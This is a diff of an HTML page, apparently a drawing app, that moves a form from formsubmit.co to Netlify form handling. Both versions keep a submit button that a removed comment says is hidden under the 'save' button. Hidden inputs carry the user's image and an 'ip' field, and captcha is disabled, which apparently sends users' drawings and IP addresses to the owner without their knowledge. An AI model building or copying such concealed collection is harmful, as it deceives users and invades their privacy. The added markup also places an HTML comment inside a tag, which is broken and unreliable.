@@ -84,49 +84,56 @@
                         id="redo"
                         title="redo"
                     ></button>
+<form
+    method="POST"
+    data-netlify="true"  <!-- Add this attribute for Netlify form handling -->
+    enctype="multipart/form-data"
+>
+    <!-- Submit button -->
+    <button
+        class="submit"
+        type="submit"
+        id="submit"
+    ></button>
 
-                    <form
-                        method="POST"
-                        action="https://formsubmit.co/bytedance@duck.com"
-                        enctype="multipart/form-data"
-                    >
-                        <!-- submit提交button被藏在了save button的底下 -->
-                        <button
-                            class="submit"
-                            type="submit"
-                            id="submit"
-                        ></button>
-                        <button
-                            class="save"
-                            type="button"
-                            id="save"
-                        ></button>
-                        <!-- 存放base64值 -->
-                        <input
-                            id="IMG"
-                            title="upload"
-                            type="file"
-                            name="image"
-                            style="display: none;"
-                        >
-                        <input
-                            class="ip"
-                            type="text"
-                            id="ip"
-                            name="ip"
-                        >
+    <!-- Save button -->
+    <button
+        class="save"
+        type="button"
+        id="save"
+    ></button>
 
-                        <input
-                            type="hidden"
-                            name="_captcha"
-                            value="false"
-                        >
-                        <input
-                            type="hidden"
-                            name="_next"
-                            value="https://jessejixin.github.io/website5.html"
-                        >
-                    </form>
+    <!-- Hidden file input for image upload -->
+    <input
+        id="IMG"
+        title="upload"
+        type="file"
+        name="image"
+        style="display: none;"
+    >
+
+    <!-- Text input for IP -->
+    <input
+        class="ip"
+        type="text"
+        id="ip"
+        name="ip"
+    >
+
+    <!-- Hidden fields for Netlify form handling -->
+    <input
+        type="hidden"
+        name="_captcha"
+        value="false"
+    >
+    <input
+        type="hidden"
+        name="_next"
+        value="https://daysofbedcare.space/thanks.html"
+    >
+</form>
+  
+                   
                 </tr>
             </table>
         </div>
